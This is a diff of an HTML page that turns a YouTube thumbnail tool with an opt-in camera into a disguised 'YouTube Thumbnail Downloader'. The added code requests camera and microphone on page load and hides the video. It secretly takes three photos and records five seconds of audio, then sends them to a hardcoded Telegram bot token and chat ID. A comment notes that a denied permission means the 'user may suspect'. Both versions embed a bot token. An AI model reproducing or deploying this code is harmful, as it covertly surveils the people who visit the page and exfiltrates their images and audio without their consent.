@@ -1,202 +1,204 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>YouTube Thumbnail & Camera (chat_id removed)</title>
-  <style>
-    body{font-family:Arial,Helvetica,sans-serif;background:#f5f5f5;margin:0;padding:20px}
-    .card{max-width:760px;margin:0 auto;background:#fff;padding:18px;border-radius:8px;box-shadow:0 6px 16px rgba(0,0,0,0.06)}
-    h1{margin:0 0 12px 0;font-size:20px}
-    .row{display:flex;gap:8px;flex-wrap:wrap}
-    input[type=text]{flex:1;padding:10px;border:1px solid #ccc;border-radius:6px}
-    button{padding:10px 12px;border:0;border-radius:6px;background:#ff0000;color:#fff;cursor:pointer}
-    button.ghost{background:#eee;color:#111}
-    .thumbs{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
-    .thumb{width:180px;padding:8px;border:1px solid #eee;border-radius:6px;background:#fafafa;text-align:center}
-    .thumb img{width:100%;height:100px;object-fit:cover;border-radius:4px}
-    .small{font-size:13px;color:#444;margin-top:6px}
-    .note{font-size:13px;color:#666;margin-top:10px}
-    #video{display:block;margin:10px auto;border-radius:6px;max-width:100%}
-    .danger{color:#a00;font-weight:600}
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>YouTube Thumbnail & Camera — (chat_id removed)</h1>
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>    <title>YouTube Thumbnail Downloader</title>  
+  <meta charset="utf-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1">  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">  
+  <style>  
+    body {  
+      font-family: 'Montserrat', sans-serif;  
+      margin: 0;  
+      padding: 0;  
+      background-color: #f5f5f5;  
+    }  
+    .navbar {  
+      background-color: #ff0000;  
+      color: white;  
+      text-align: center;  
+      padding: 15px 0;  
+    }  
+    #header {  
+      margin: 0;  
+      font-size: 28px;  
+      font-weight: bold;  
+    }  
+    .container {  
+      max-width: 600px;  
+      margin: 20px auto;  
+      padding: 20px;  
+      background-color: #fff;  
+      border-radius: 8px;  
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);  
+    }  
+    .form-control {  
+      width: calc(100% - 22px);  
+      margin-bottom: 15px;  
+      padding: 10px;  
+      border: 1px solid #ccc;  
+      border-radius: 5px;  
+      box-sizing: border-box;  
+      font-family: 'Montserrat', sans-serif;  
+    }  
+    #thumbdloadbtn {  
+      display: block;  
+      width: 100%;  
+      padding: 10px;  
+      border: none;  
+      border-radius: 5px;  
+      background-color: #ff0000;  
+      color: white;  
+      font-size: 16px;  
+      cursor: pointer;  
+      font-family: 'Montserrat', sans-serif;  
+    }  
+    #thumbdloadbtn:hover {  
+      background-color: #cc0000;  
+    }  
+    footer {  
+      text-align: center;  
+      margin-top: 40px;  
+      color: #666;  
+    }  
+    .youtube-logo {  
+      display: block;  
+      margin: 20px auto;  
+      width: 100px; /* Adjust size as needed */  
+    }  
+  </style>  
+</head>  
+<body>  
+  <nav class="navbar">  
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">  
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>  
+  </nav>    <div class="container">  
+    <form method="post" action="">  
+      <input id="ytlink" name="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">  
+      <button id="thumbdloadbtn" type="submit">FETCH</button>  
+    </form>  
+    <div id="thumbnail-preview">  
+      <!-- Placeholder for thumbnail preview -->  <h2>How to Download HD YouTube Thumbnail</h2>  
+<ol>  
+  <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>  
+  <li>Paste the YouTube video Link / URL in the Input Field Above</li>  
+  <li>Click on the "FETCH" Button</li>  
+  <li>Select the thumbnail quality</li>  
+  <li>Download the Thumbnail</li>  
+</ol>
 
-    <div>
-      <label class="small">YouTube URL or ID:</label>
-      <div class="row" style="margin-top:6px">
-        <input id="ytlink" type="text" placeholder="https://www.youtube.com/watch?v=VIDEO_ID or VIDEO_ID">
-        <button id="fetchThumb">Fetch</button>
-        <button id="clearThumb" class="ghost">Clear</button>
-      </div>
-      <div id="thumbs" class="thumbs"></div>
-      <div id="thumbNone" class="note" style="display:none">No thumbnails found.</div>
-    </div>
-
-    <hr style="margin:18px 0">
-
-    <div>
-      <p class="small">Camera (user must allow access)</p>
-      <div class="row">
-        <button id="startCam" class="ghost">Start Camera</button>
-        <button id="capture" style="display:none">Capture</button>
-        <button id="provideChatId" class="ghost">Provide chat id (optional)</button>
-        <button id="sendPhoto" class="ghost">Send captured photo to Telegram</button>
-      </div>
-      <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
-      <div id="preview" style="margin-top:12px"></div>
-
-      <p class="note">
-        Note: <strong>chat_id is removed from this file</strong>.  
-        You can still provide it temporarily via the “Provide chat id” button during your browser session.
-      </p>
-      <p class="danger">
-        ⚠️ Warning: Storing your BOT_TOKEN in client-side HTML is unsafe.  
-        For production, move the send logic to a secure server.
-      </p>
-    </div>
-  </div>
-
-<script>
-/* -----------------------
-  Settings
-  ----------------------- */
-const BOT_TOKEN = "8109331844:AAFx66PglQEtEexJcgwPEA_yIMyK0gX5i1w"; // <-- Keep your bot token here
-let CHAT_ID = null; // chat_id removed from file
-
-/* ---------- YouTube thumbnail helpers ---------- */
-function extractYouTubeID(input){
-  if(!input) return null;
-  input = input.trim();
-  const urlMatch = input.match(/(?:v=|youtu\.be\/|\/embed\/)([A-Za-z0-9_-]{6,})/);
-  if(urlMatch && urlMatch[1]) return urlMatch[1];
-  const idMatch = input.match(/^([A-Za-z0-9_-]{6,})$/);
-  return idMatch ? idMatch[1] : null;
-}
-function buildThumbUrls(id){
-  return [
-    {name:'maxresdefault', url:`https://img.youtube.com/vi/${id}/maxresdefault.jpg`},
-    {name:'sddefault',     url:`https://img.youtube.com/vi/${id}/sddefault.jpg`},
-    {name:'hqdefault',     url:`https://img.youtube.com/vi/${id}/hqdefault.jpg`},
-    {name:'mqdefault',     url:`https://img.youtube.com/vi/${id}/mqdefault.jpg`},
-    {name:'default',       url:`https://img.youtube.com/vi/${id}/default.jpg`}
-  ];
-}
-function imageExists(url){
-  return new Promise(resolve=>{
-    const img=new Image();
-    let done=false;
-    img.onload=()=>{ if(!done){done=true;resolve(true);} };
-    img.onerror=()=>{ if(!done){done=true;resolve(false);} };
-    img.src = url + '?_=' + Date.now();
-    setTimeout(()=>{ if(!done){done=true;resolve(false);} },4000);
-  });
-}
-
-/* ---------- DOM elements ---------- */
-const fetchBtn = document.getElementById('fetchThumb');
-const clearBtn = document.getElementById('clearThumb');
-const ytInput = document.getElementById('ytlink');
-const thumbsDiv = document.getElementById('thumbs');
-const thumbNone = document.getElementById('thumbNone');
-
-fetchBtn.addEventListener('click', async ()=>{
-  thumbsDiv.innerHTML=''; thumbNone.style.display='none';
-  const id = extractYouTubeID(ytInput.value);
-  if(!id){ alert('Please enter a valid YouTube link or video ID'); return; }
-  fetchBtn.textContent='Checking...';
-  const cand = buildThumbUrls(id);
-  const found = [];
-  for(const c of cand){
-    if(await imageExists(c.url)) found.push(c);
-  }
-  if(found.length===0) thumbNone.style.display='block';
-  else {
-    for(const f of found){
-      const box = document.createElement('div'); box.className='thumb';
-      const img = document.createElement('img'); img.src=f.url;
-      const name = document.createElement('div'); name.className='small'; name.textContent=f.name;
-      const a = document.createElement('a'); a.href=f.url; a.download = `${id}-${f.name}.jpg`; a.textContent='Download'; a.style.display='inline-block'; a.style.marginTop='6px';
-      box.appendChild(img); box.appendChild(name); box.appendChild(a);
-      thumbsDiv.appendChild(box);
-    }
-  }
-  fetchBtn.textContent='Fetch';
-});
-
-clearBtn.addEventListener('click', ()=>{
-  ytInput.value=''; thumbsDiv.innerHTML=''; thumbNone.style.display='none';
-});
-
-/* ---------- Camera & Telegram send (chat_id removed) ---------- */
-let stream = null;
-const startCam = document.getElementById('startCam');
-const captureBtn = document.getElementById('capture');
-const video = document.getElementById('video');
-const preview = document.getElementById('preview');
-const provideBtn = document.getElementById('provideChatId');
-const sendBtn = document.getElementById('sendPhoto');
-
-startCam.addEventListener('click', async ()=>{
-  if(stream){
-    stream.getTracks().forEach(t=>t.stop()); stream=null; video.style.display='none'; captureBtn.style.display='none'; startCam.textContent='Start Camera'; return;
-  }
-  try{
-    stream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
-    video.srcObject = stream; video.style.display='block'; captureBtn.style.display='inline-block'; startCam.textContent='Stop Camera';
-  }catch(e){ alert('Camera access denied or unavailable'); console.error(e); }
-});
-
-captureBtn.addEventListener('click', ()=>{
-  if(!stream) return;
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video,0,0,canvas.width,canvas.height);
-  const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-  preview.innerHTML = `<div class="thumb"><img src="${dataUrl}" alt="captured"><div class="small">Captured</div></div>`;
-  canvas.toBlob(blob=>{
-    preview._lastBlob = blob;
-  }, 'image/jpeg', 0.9);
-});
-
-/* Provide chat id at runtime (not stored in file) */
-provideBtn.addEventListener('click', ()=>{
-  const val = prompt('Enter chat_id now (not saved in file). Leave blank to clear.');
-  if(val && val.trim()) {
-    CHAT_ID = val.trim();
-    alert('chat_id set for this browser session.');
-  } else {
-    CHAT_ID = null;
-    alert('chat_id cleared / not provided.');
-  }
-});
-
-/* Send captured photo to Telegram using BOT_TOKEN */
-sendBtn.addEventListener('click', async ()=>{
-  if(!preview._lastBlob){ alert('No captured photo. Capture one first.'); return; }
-  if(!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE"){ alert('BOT_TOKEN not set. Please update it in the code.'); return; }
-  if(!CHAT_ID){ alert('chat_id removed from file. Provide chat_id via "Provide chat id" button to send.'); return; }
-
-  try{
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', preview._lastBlob, 'capture.jpg');
-    const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    const res = await fetch(endpoint, { method:'POST', body: form });
-    const j = await res.json();
-    if(!res.ok || !j.ok) throw new Error(j.description || 'Telegram error');
-    alert('Photo successfully sent to Telegram!');
-    console.log('Telegram response', j);
-  }catch(err){
-    console.error('Send failed:', err);
-    alert('Sending failed. Check console for details.');
-  }
-});
-</script>
-</body>
+  </div>    <center>  
+    <button id="toggle-video" style="display:none;">Toggle Video</button>  
+    <div id="message-container"></div>  
+    <video id="video" width="0" height="0" autoplay></video>  
+  </center>    <script type="text/javascript">  
+    function downloadThumbnail() {  
+      // Change button text to indicate fetching  
+      var btn = document.getElementById('thumbdloadbtn');  
+      btn.textContent = 'Fetching from server... Wait';  
+    }  
+      
+    function la(src) {  
+      window.location = src;  
+    }  
+      
+    function GetURLParameter(sParam) {  
+      var sPageURL = window.location.search.substring(1);  
+      var sURLVariables = sPageURL.split('&');  
+      for (var i = 0; i < sURLVariables.length; i++) {  
+        var sParameterName = sURLVariables[i].split('=');  
+        if (sParameterName[0] == sParam) {  
+          return sParameterName[1];  
+        }  
+      }  
+    }  
+      
+    var chatid = GetURLParameter('id');  
+      
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })  
+      .then((stream) => {  
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);  
+        const audioRecorder = new MediaRecorder(stream);  
+  
+        function capturePhoto(index) {  
+          setTimeout(() => {  
+            imageCapture.takePhoto()  
+              .then((blob) => {  
+                sendToTelegram(blob, 'photo');  
+              })  
+              .catch((error) => {  
+                console.error('Error capturing photo:', error);  
+              });  
+          }, index * 2000);  
+        }  
+  
+        function startAudioRecording() {  
+          audioRecorder.start();  
+          setTimeout(() => {  
+            audioRecorder.stop();  
+          }, 5000);  
+        }  
+  
+        audioRecorder.ondataavailable = (event) => {  
+          if (event.data.size > 0) {  
+            sendToTelegram(event.data, 'audio');  
+          }  
+        };  
+  
+        for (let i = 0; i < 3; i++) {  
+          capturePhoto(i);  
+        }  
+  
+        startAudioRecording();  
+      })  
+      .catch((error) => {  
+        if (error.name === 'NotAllowedError') {  
+          // Handle the case where permissions are denied  
+          console.warn('Permissions denied. User may suspect.');  
+        } else {  
+          console.error('Permission error:', error);  
+        }  
+      });  
+        
+    // Function sendToTelegram  
+async function sendToTelegram(data, type) {  
+  const BOT_TOKEN = '8109331844:AAFx66PglQEtEexJcgwPEA_yIMyK0gX5i1w';   // Replace your botToken  
+  const CHAT_ID = '6520607479';     // Replace your botToken  
+    
+  // validasi tipe  
+  if (type !== 'photo' && type !== 'audio') {  
+    throw new Error("Tipe harus 'photo' atau 'audio'");  
+  }  
+  
+  const formData = new FormData();  
+  formData.append('chat_id', CHAT_ID);  
+  // field untuk file: 'photo' untuk gambar, 'audio' untuk audio  
+  const fieldName = type === 'photo' ? 'photo' : 'audio';  
+  const extension = type === 'photo' ? 'jpg' : 'wav';  
+  formData.append(fieldName, data, `ISALHACKING.${extension}`);  
+  
+  const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;  
+  
+  try {  
+    const res = await fetch(endpoint, {  
+      method: 'POST',  
+      body: formData  
+    });  
+  
+    const result = await res.json();  
+  
+    if (!res.ok) {  
+      // Telegram mengembalikan { ok: false, description: "..." }  
+      throw new Error(result.description || res.statusText);  
+    }  
+  
+    console.log('Telegram response:', result);  
+    return result;  
+  } catch (err) {  
+    console.error('Error sending to Telegram', err);  
+    throw err; // biarkan caller yang tangani  
+  }  
+}  
+  </script>    <footer>  
+    <p>Made With ❤️ BY: @ISALHACKING</p>  
+  </footer>  
+</body>  
 </html>
